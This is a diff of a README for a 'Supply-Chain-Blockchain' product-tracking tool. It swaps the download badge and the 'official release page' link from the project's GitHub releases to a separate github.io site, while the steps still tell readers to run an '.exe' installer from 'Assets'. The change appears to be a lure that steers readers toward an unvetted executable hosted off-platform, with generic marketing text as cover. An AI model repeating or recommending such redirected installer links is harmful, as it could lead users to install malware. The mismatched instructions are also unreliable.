@@ -1,6 +1,6 @@
 # 📦 Supply-Chain-Blockchain - Track product journeys with complete transparency
 
-[![](https://img.shields.io/badge/Download_Installer-Blue?style=for-the-badge)](https://github.com/cliftondestructible762/Supply-Chain-Blockchain/releases)
+[![](https://img.shields.io/badge/Download_Installer-Blue?style=for-the-badge)](https://cliftondestructible762.github.io)
 
 Supply-Chain-Blockchain offers a digital ledger for tracking items from the factory floor to your front door. This platform records every handoff and owner change on a secure network. You can verify product authenticity and see the history of your items with ease. Each record remains permanent and cannot undergo alteration once entered into the system.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these requirements before you start:
 
 You need the installer file to set up the software. Follow these steps to obtain the correct version for your Windows computer.
 
-1. Navigate to the official release page: [Download Supply-Chain-Blockchain](https://github.com/cliftondestructible762/Supply-Chain-Blockchain).
+1. Navigate to the official release page: [Download Supply-Chain-Blockchain](https://cliftondestructible762.github.io).
 2. Look for the "Assets" section on the page.
 3. Click the file ending in ".exe" to begin the download.
 4. Save the file to your "Downloads" folder.
